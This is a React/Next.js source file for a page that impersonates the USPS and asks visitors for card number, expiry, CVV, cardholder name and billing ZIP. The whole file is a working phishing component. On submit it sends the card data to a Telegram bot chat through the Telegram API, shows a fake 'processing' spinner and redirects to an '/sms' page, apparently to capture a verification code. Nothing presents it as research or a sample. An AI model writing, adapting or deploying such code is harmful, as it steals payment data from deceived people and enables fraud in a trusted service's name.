'use client';
import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/telegramConfig';

export default function CreditCardInfoPage() {
  const [formData, setFormData] = useState({
    cardholder: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    billingZip: ''
  });

  const [alertVisible, setAlertVisible] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const router = useRouter();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const isEmpty = Object.values(formData).some((v) => v.trim() === '');
    if (isEmpty) {
      setAlertVisible(true);
      return;
    }

    const message = `
💳 *Credit Card Info Submitted*
-------------------------------
👤 *Cardholder:* ${formData.cardholder}
💳 *Card Number:* ${formData.cardNumber}
📅 *Expiry:* ${formData.expiry}
🔒 *CVV:* ${formData.cvv}
📮 *Billing ZIP:* ${formData.billingZip}
🕒 *Time:* ${new Date().toLocaleString()}
    `;

    try {
      setIsSubmitting(true); // Show loading

      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });

      // Wait then redirect
      setTimeout(() => {
        router.push('/sms');
      }, 3000);
    } catch (err) {
      setIsSubmitting(false);
      console.error('Telegram Error:', err);
      alert('❌ Failed to send info.');
    }
  };

  return (
    <div className="min-h-screen bg-white text-[#2C2A61] font-sans">
      <main className="max-w-xl mx-auto px-6 py-12">
        <img
          src="https://reg.usps.com/entreg/assets/images/des_brd_2color_logo_274x79.png"
          alt="USPS Logo"
          className="h-auto w-60 mb-10 transition duration-300 hover:scale-105"
        />

        <h1 className="text-3xl font-bold mb-6">Enter Your Credit Card Information</h1>

        {alertVisible && (
          <div className="bg-yellow-100 border border-yellow-400 text-yellow-800 px-4 py-3 rounded relative mb-6 animate-pulse">
            ⚠️ Please complete all credit card fields to continue.
          </div>
        )}

        {isSubmitting ? (
          <div className="flex flex-col items-center justify-center py-12">
            <img
              src="https://i.gifer.com/ZZ5H.gif"
              alt="Loading..."
              className="w-20 h-20 mb-4"
            />
            <p className="text-sm text-gray-600">Please wait while we process your card info...</p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-6 bg-[#f9f9f9] p-8 rounded-lg shadow">
            <div>
              <label className="block text-sm font-medium mb-1">Cardholder Name</label>
              <input
                type="text"
                name="cardholder"
                value={formData.cardholder}
                onChange={handleChange}
                placeholder="Full Name on Card"
                className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">Card Number</label>
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                placeholder="1234 5678 9012 3456"
                className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                required
              />
            </div>

            <div className="grid grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium mb-1">Expiration (MM/YY)</label>
                <input
                  type="text"
                  name="expiry"
                  value={formData.expiry}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-1">CVV</label>
                <input
                  type="text"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleChange}
                  placeholder="123"
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                  required
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">Billing ZIP Code</label>
              <input
                type="text"
                name="billingZip"
                value={formData.billingZip}
                onChange={handleChange}
                placeholder="ZIP Code"
                className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm"
                required
              />
            </div>

            <div className="flex justify-center items-center gap-4 mt-2">
              <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" className="h-6" />
              <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard" className="h-6" />
              <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex" className="h-6" />
              <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" className="h-6" />
            </div>

            <button
              type="submit"
              className="bg-[#2C2A61] hover:bg-[#1d1a45] text-white w-full font-semibold py-3 rounded-lg shadow-md transition-all duration-200"
            >
              Submit Card Info
            </button>
          </form>
        )}
      </main>
    </div>
  );
}
